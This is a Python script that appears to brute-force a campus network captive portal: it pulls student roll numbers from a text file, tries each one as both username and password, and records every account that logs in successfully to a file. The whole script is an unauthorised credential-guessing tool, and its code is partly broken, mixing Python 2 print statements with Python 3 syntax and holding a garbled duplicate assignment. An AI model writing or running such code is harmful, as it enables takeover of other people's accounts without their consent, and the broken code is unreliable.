from os import path, popen, remove
from time import sleep
from requests import post, head, Session, ConnectionError, get
# from getpass import getpass
import urllib
import  re
pattern = r"([A-Z]+)(\d+)([A-Z]+)"
frolls = open('rollnos.txt','r')
a = frolls.read()
string = a
matches = re.findall(pattern, string, flags=0)
matches_final = [''.join(match) for match in matches]
matches_final += [''.join(match).lower() for match in matches]
matches_final = matches_final
fo = open("123.txt",'a+')
def login(uname, passw):
    url_1 = 'http://www.google.co.in'
    headers = \
        {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36'}
    session = Session()
    res = session.get(url_1, headers=headers)
    magic = res.url.split('?')[1]
    my_referer = res.url
    payload = {
        '4Tredir': 'http://google.com/',
        'username': uname,
        'password': passw,
        'magic': str(magic),
        }
    url_2 = 'http://gstatic.com'
    res = post(url_2, headers=headers, data=payload)
    if 'Failed' in res.text:
        print uname

        return False
    else:
        fo.write(''.join(uname)+'\n')
        print(uname+ ' added to the file and checking for the next one...')
        return True

def main():
    print("Checking connectivity..")
    try:
        res = head('http://www.google.co.in')
        print('Already connected. :)')
        headers =\
         {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36'}
              
        res2 = post("https://172.16.24.1:1000/logout?000a0e020b1241ca",headers=headers)
        print "Logged out successfully"
    except ConnectionError:
        for i in range(len(matches_final)):
            print i, matches_final[i]
            username = matches_final[i]
            password = matches_final[i]
            if login(username, password):
                headers =\
headers={'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36'}
                r = get(url ="http://172.16.24.1:1000/logout?000a0e020b1241ca", headers=headers)
                
                print r
                print "Logged out successfully"
            else:
                pass
if __name__ == '__main__':
    main()